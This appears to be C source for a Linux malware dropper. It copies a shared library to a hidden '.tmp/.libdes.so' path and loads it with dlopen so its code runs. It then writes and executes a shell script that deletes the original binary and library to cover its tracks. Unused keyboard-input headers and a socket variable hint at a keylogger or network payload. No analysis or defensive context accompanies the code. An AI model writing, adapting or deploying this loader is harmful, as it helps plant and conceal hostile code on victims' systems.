#include <dirent.h>
#include <ctype.h>
#include <dlfcn.h>
#include <errno.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int sock;
FILE *file;

int shell() {
    file = fopen("run.sh","w");
    if (!file) {
        return 1;
    }
    fprintf(file, "#!/bin/bash\n");
    fprintf(file, "DIR=\"$(dirname \\\"$(readlink -f \\\"$0\\\")\\\")\"\n");
    fprintf(file, "rm -f \"$DIR/linux\"\n");
    fprintf(file, "rm -f \"$DIR/libdes.so\"\n");
    fclose(file);
    system("chmod +x run.sh");
    system("./run.sh");
    return 0;
}
int main(void) {
    const char *created = "libdes.so";
    const char *target = "./.tmp/.libdes.so";
    if (mkdir("./.tmp", 0755) == -1 && errno != EEXIST) {
        perror("mkdir failed");
        return 1;
    }

    int source = open(created, O_RDONLY);
    if (source == -1) {
        return -1;
    }

    int dest = open(target,O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dest == -1) {
        return -1;
    }

    char buffer[150];
    ssize_t read_bytes;
    while ((read_bytes = read(source,buffer,sizeof(buffer))) > 0){
        write(dest,buffer,read_bytes);
    }

    close(source);
    close(dest);
    void *load = dlopen(target, RTLD_LAZY);
    while (!load) {
        return 1;
    }
    sleep(2);
    shell();
    return 0;
}
